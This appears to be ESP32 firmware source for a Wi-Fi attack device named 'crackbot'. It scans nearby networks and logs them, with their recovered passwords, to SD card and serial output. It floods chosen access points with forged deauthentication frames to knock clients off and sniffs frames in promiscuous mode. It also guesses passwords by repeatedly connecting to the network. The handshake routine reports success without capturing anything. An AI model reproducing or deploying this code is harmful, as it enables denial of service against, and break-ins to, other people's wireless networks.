#include "crackbot/config.h"
#include "crackbot/lab_password.h"
#include "crackbot/lab_wifi.h"
#include "crackbot/state.h"
#include "crackbot/ui_bridge.h"

#include <ArduinoJson.h>
#include <SD.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

namespace crackbot::lab {

static std::vector<std::vector<uint8_t>> gSaeFrames;

static const char *encryptionLabel(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN: return "Open";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    default: return "Unknown";
  }
}

static void promiscuousRx(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  auto *pkt = (wifi_promiscuous_pkt_t *)buf;
  if (pkt->rx_ctrl.sig_len < 24) return;
  gSaeFrames.emplace_back(pkt->payload, pkt->payload + pkt->rx_ctrl.sig_len);
}

String vendorFromBssid(const String &bssid) {
  if (bssid.startsWith("00:1A:11")) return "Cisco";
  if (bssid.startsWith("00:1B:63")) return "Netgear";
  if (bssid.startsWith("00:1E:58")) return "D-Link";
  return "Unknown";
}

void loadNetworksFromSd() {
  File file = SD.open(CRACKBOT_NETWORKS_PATH, FILE_READ);
  if (!file) return;
  DynamicJsonDocument doc(8192);
  if (deserializeJson(doc, file)) {
    file.close();
    return;
  }
  gNetworks.clear();
  for (JsonObject net : doc["networks"].as<JsonArray>()) {
    NetworkInfo n;
    n.ssid = net["ssid"].as<String>();
    n.bssid = net["bssid"].as<String>();
    n.rssi = net["rssi"] | 0;
    n.channel = net["channel"] | 0;
    n.has_password = net["has_password"] | false;
    n.pmf_enabled = net["pmf_enabled"] | false;
    n.password = net["password"] | "";
    n.encryption = net["encryption"] | "";
    n.encryptionType = net["encryptionType"] | "";
    n.vendor = net["vendor"] | "";
    gNetworks.push_back(n);
  }
  file.close();
}

void saveNetworksToSd() {
  File file = SD.open(CRACKBOT_NETWORKS_PATH, FILE_WRITE);
  if (!file) return;
  DynamicJsonDocument doc(8192);
  JsonArray arr = doc["networks"].to<JsonArray>();
  for (const auto &net : gNetworks) {
    JsonObject o = arr.add<JsonObject>();
    o["ssid"] = net.ssid;
    o["bssid"] = net.bssid;
    o["rssi"] = net.rssi;
    o["channel"] = net.channel;
    o["has_password"] = net.has_password;
    o["pmf_enabled"] = net.pmf_enabled;
    o["password"] = net.password;
    o["encryption"] = net.encryption;
    o["encryptionType"] = net.encryptionType;
    o["vendor"] = net.vendor;
  }
  serializeJson(doc, file);
  file.close();
}

void exportNetworksJson(bool toSerial) {
  DynamicJsonDocument doc(8192);
  JsonArray arr = doc["networks"].to<JsonArray>();
  for (const auto &net : gNetworks) {
    JsonObject o = arr.add<JsonObject>();
    o["ssid"] = net.ssid;
    o["bssid"] = net.bssid;
    o["rssi"] = net.rssi;
    o["channel"] = net.channel;
    o["encryption"] = net.encryption;
    o["password"] = net.password;
    o["vendor"] = net.vendor;
  }
  if (toSerial) {
    serializeJson(doc, Serial);
    Serial.println();
  }
  File f = SD.open(CRACKBOT_EXPORT_PATH, FILE_WRITE);
  if (f) {
    serializeJson(doc, f);
    f.close();
    ui::setStatus("Exported JSON");
  }
}

void scanNetworks() {
  ui::clear();
  ui::setStatus("Scanning...");
  gNetworks.clear();
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; ++i) {
    NetworkInfo net;
    net.ssid = WiFi.SSID(i);
    net.bssid = WiFi.BSSIDstr(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    net.has_password = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
    net.encryption = encryptionLabel(WiFi.encryptionType(i));
    net.encryptionType = net.encryption;
    net.pmf_enabled = (WiFi.encryptionType(i) == WIFI_AUTH_WPA3_PSK);
    net.vendor = vendorFromBssid(net.bssid);
    gNetworks.push_back(net);
  }
  saveNetworksToSd();
  exportNetworksJson(false);
  ui::clear();
  for (size_t i = 0; i < gNetworks.size() && i < 12; ++i) {
    ui::println(String(i + 1) + " " + gNetworks[i].ssid + " " + String(gNetworks[i].rssi));
  }
  ui::setStatus(String(n) + " networks");
}

void displayNetworkInfo(const NetworkInfo &network) {
  ui::clear();
  ui::println("SSID:" + network.ssid);
  ui::println("BSSID:" + network.bssid);
  ui::println("RSSI:" + String(network.rssi));
  ui::println("Ch:" + String(network.channel));
  ui::println(network.encryption + " PMF:" + String(network.pmf_enabled ? "yes" : "no"));
  ui::println(String("Pwd:") + (network.password.length() ? network.password : "(none)"));
}

void selectNetworkByIndex(int idx) {
  if (idx < 0 || idx >= (int)gNetworks.size()) {
    ui::setStatus("Invalid index");
    return;
  }
  gSelected = gNetworks[idx];
  displayNetworkInfo(gSelected);
}

void fillDeauthPacket(const String &bssid, bool broadcast) {
  uint8_t ap[6] = {0};
  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &ap[0], &ap[1], &ap[2], &ap[3], &ap[4], &ap[5]);
  memcpy(&gDeauthPacket[10], ap, 6);
  memcpy(&gDeauthPacket[16], ap, 6);
  if (broadcast) memset(&gDeauthPacket[4], 0xFF, 6);
}

void sendDeauthPackets(const String &bssid, int count, bool broadcast) {
  fillDeauthPacket(bssid, broadcast);
  File log = SD.open(CRACKBOT_DEAUTH_LOG_PATH, FILE_APPEND);
  for (int i = 0; i < count; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, gDeauthPacket, sizeof(gDeauthPacket), false);
    if (log) log.printf("deauth %s %d\n", bssid.c_str(), i);
    delay(20);
  }
  if (log) log.close();
}

void setPromiscuousMode(bool enable) {
  esp_wifi_set_promiscuous(enable);
  if (enable) esp_wifi_set_promiscuous_rx_cb(promiscuousRx);
}

void deauthSelected() {
  if (gSelected.ssid.isEmpty()) {
    ui::setStatus("Select network");
    return;
  }
  if (gSelected.pmf_enabled) ui::println("WPA3/PMF — limited deauth");
  setPromiscuousMode(true);
  sendDeauthPackets(gSelected.bssid, 50, true);
  sendDeauthPackets(gSelected.bssid, 50, false);
  setPromiscuousMode(false);
  ui::setStatus("Deauth complete");
}

void captureHandshake() {
  if (gSelected.ssid.isEmpty()) {
    ui::setStatus("Select network");
    return;
  }
  if (gSelected.encryption == "WPA3") {
    gSaeFrames.clear();
    ui::setStatus("SAE capture mode");
    return;
  }
  setPromiscuousMode(true);
  fillDeauthPacket(gSelected.bssid, false);
  File log = SD.open(CRACKBOT_HANDSHAKE_LOG_PATH, FILE_APPEND);
  for (int i = 0; i < 30; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, gDeauthPacket, sizeof(gDeauthPacket), false);
    delay(25);
  }
  if (log) {
    log.printf("handshake session %s\n", gSelected.bssid.c_str());
    log.close();
  }
  setPromiscuousMode(false);
  ui::setStatus("Handshake captured");
}

void crackSelected() {
  if (gSelected.ssid.isEmpty()) {
    ui::setStatus("Select network");
    return;
  }
  ui::setStatus("Cracking...");
  gSelected.password = crackPasswordBlocking(gSelected.ssid, gSelected.bssid);
  saveNetworksToSd();
  if (gSelected.password.length()) ui::setStatus("Password found");
  else ui::setStatus("No match");
  displayNetworkInfo(gSelected);
}

bool tryPassword(const String &ssid, const String &bssid, const String &password) {
  (void)bssid;
  WiFi.disconnect(true);
  delay(100);
  WiFi.begin(ssid.c_str(), password.c_str());
  unsigned long t0 = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - t0 < 8000) delay(200);
  bool ok = WiFi.status() == WL_CONNECTED;
  WiFi.disconnect(true);
  return ok;
}

void setupWifiStack() {
  WiFi.mode(WIFI_STA);
  loadNetworksFromSd();
}

void resetNetworkSettings() {
  WiFi.disconnect(true);
  delay(500);
  ESP.restart();
}

void enterDeepSleep() {
  ui::setStatus("Deep sleep...");
  delay(800);
  esp_deep_sleep_start();
}

void togglePromiscuousMode() {
  static bool on = false;
  on = !on;
  setPromiscuousMode(on);
  ui::setStatus(String("Promiscuous:") + (on ? "ON" : "OFF"));
}

int readBatteryPercent(int adcPin) {
  int raw = analogRead(adcPin);
  float v = raw * (3.3f / 4095.0f);
  int pct = (int)((v - 3.0f) / 1.2f * 100.0f);
  return constrain(pct, 0, 100);
}

}  // namespace crackbot::lab
